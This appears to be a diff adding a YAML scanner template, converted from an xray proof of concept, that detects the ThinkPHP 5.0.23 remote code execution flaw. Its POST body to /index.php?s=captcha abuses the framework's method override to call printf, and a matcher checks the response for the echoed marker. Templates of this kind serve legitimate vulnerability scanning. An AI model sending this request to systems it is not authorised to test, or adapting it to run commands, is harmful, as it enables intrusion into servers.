@@ -1,0 +1,29 @@
+# 来源: xray（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      _method=__construct&filter[]=printf&method=GET&server[REQUEST_METHOD]=TmlnaHQgZ2F0aGVycywgYW5%25%25kIG5vdyBteSB3YXRjaCBiZWdpbnMu&get[]=1
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        part: body
+        words:
+          - TmlnaHQgZ2F0aGVycywgYW5%kIG5vdyBteSB3YXRjaCBiZWdpbnMu1
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/index.php?s=captcha'
+id: thinkphp5023-method-rce
+info:
+  author: argus-import
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: 在符合以下条件的情况下，我们欢迎任何人以任何形式使用本项目（包括商用）。
+    argus-import-source: xray
+    argus-risk-level: medium
+  name: thinkphp5023-method-rce
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
+  severity: medium
+  tags: argus-import
